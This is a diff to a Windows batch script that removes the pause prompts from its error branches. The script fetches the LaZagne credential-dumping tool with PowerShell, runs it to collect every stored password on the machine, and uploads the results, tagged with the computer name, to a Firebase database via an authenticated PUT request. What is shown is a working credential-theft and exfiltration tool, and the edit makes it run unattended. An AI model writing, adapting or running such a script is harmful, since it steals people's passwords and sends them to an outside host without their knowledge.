@@ -21,12 +21,10 @@ if not exist "%LAZAGNE_EXE%" (
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
     if errorlevel 1 (
         echo   [ERROR] Download failed! Check details below.
-        pause
         exit /b 1
     )
     if not exist "%LAZAGNE_EXE%" (
         echo   [ERROR] File not downloaded, check internet or URL.
-        pause
         exit /b 1
     )
     echo   [OK] Successfully downloaded.
@@ -50,7 +48,6 @@ if not exist "%OUTPUT_DIR%" (
     mkdir "%OUTPUT_DIR%" 2>nul
     if errorlevel 1 (
         echo   [ERROR] Failed to create directory!
-        pause
         exit /b 1
     )
 )
@@ -60,14 +57,12 @@ echo   [OK] Directory ready: %OUTPUT_DIR%
 echo [4/5] Collecting credentials...
 if not exist "%LAZAGNE_EXE%" (
     echo   [ERROR] LaZagne.exe not found!
-    pause
     exit /b 1
 )
 echo   [INFO] Running LaZagne...
 "%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
 if errorlevel 1 (
     echo   [ERROR] Error running LaZagne!
-    pause
     exit /b 1
 )
 echo   [OK] LaZagne ran, waiting for output...
@@ -77,7 +72,6 @@ for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "
 if not defined RESULT_FILE (
     echo   [ERROR] No result file found! Checking directory: %OUTPUT_DIR%
     dir "%OUTPUT_DIR%"
-    pause
     exit /b 1
 )
 echo   [OK] Result file found: %OUTPUT_DIR%\%RESULT_FILE%
@@ -91,7 +85,6 @@ echo   [DEBUG] PC Name: %PC_NAME%
 powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'; if($response) { Write-Host '  [OK] Success!' } else { Write-Host '  [ERROR] Upload failed!' }"
 if errorlevel 1 (
     echo   [ERROR] Firebase upload failed!
-    pause
     exit /b 1
 )
 echo   [OK] Firebase upload successful!
